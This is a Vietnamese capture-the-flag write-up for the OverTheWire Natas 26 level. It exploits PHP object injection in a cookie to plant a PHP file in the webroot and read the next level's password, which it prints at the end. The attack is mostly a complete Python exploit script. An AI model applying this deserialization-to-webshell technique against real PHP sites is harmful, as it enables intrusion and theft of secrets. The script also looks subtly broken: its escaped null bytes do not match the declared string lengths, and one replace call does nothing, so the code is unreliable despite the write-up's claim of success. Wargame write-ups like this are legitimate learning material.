# Natas 26 → 27

## Mục tiêu

Lấy password của `natas27` bằng PHP object injection trong cookie `drawing`.

## Tôi thấy

Source gọi `unserialize(base64_decode($_COOKIE["drawing"]))`. Class `Logger` ghi `$exitMsg` vào file `$logFile` trong destructor. Có thể tạo object serialized, đặt log file trong webroot với đuôi `.php`, rồi đặt PHP code đọc `/etc/natas_webpass/natas27` vào `$exitMsg`.

## Cách làm

```python
import base64
import requests

s = requests.Session()
auth = ('natas26', '<password>')
s.get('http://natas26.natas.labs.overthewire.org/', auth=auth)
sid = s.cookies['PHPSESSID']
path = f'img/natas26_{sid}.php'
payload = "<?php readfile('/etc/natas_webpass/natas27'); ?>"
serialized = (
    f'O:6:"Logger":3:{{'
    f's:15:"\\x00Logger\\x00logFile";s:{len(path)}:"{path}";'
    f's:15:"\\x00Logger\\x00initMsg";s:0:"";'
    f's:15:"\\x00Logger\\x00exitMsg";s:{len(payload)}:"{payload}";}}'
).replace('\\x00', '\\x00')
cookie = base64.b64encode(serialized.encode()).decode()
s.get(
    'http://natas26.natas.labs.overthewire.org/',
    auth=auth,
    params={'x1': '1', 'y1': '1', 'x2': '2', 'y2': '2'},
    cookies={'drawing': cookie},
)
r = s.get(f'http://natas26.natas.labs.overthewire.org/{path}', auth=auth)
print(r.text)
```

Response live trả password của `natas27`.

## Vì sao cách này hiệu quả

`unserialize()` khôi phục object do client kiểm soát. Khi request kết thúc, destructor mở file do object chỉ định và ghi PHP code vào đó. File `.php` sau đó được gọi trực tiếp.

## Kết quả

Password của `natas27`:

```text
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```

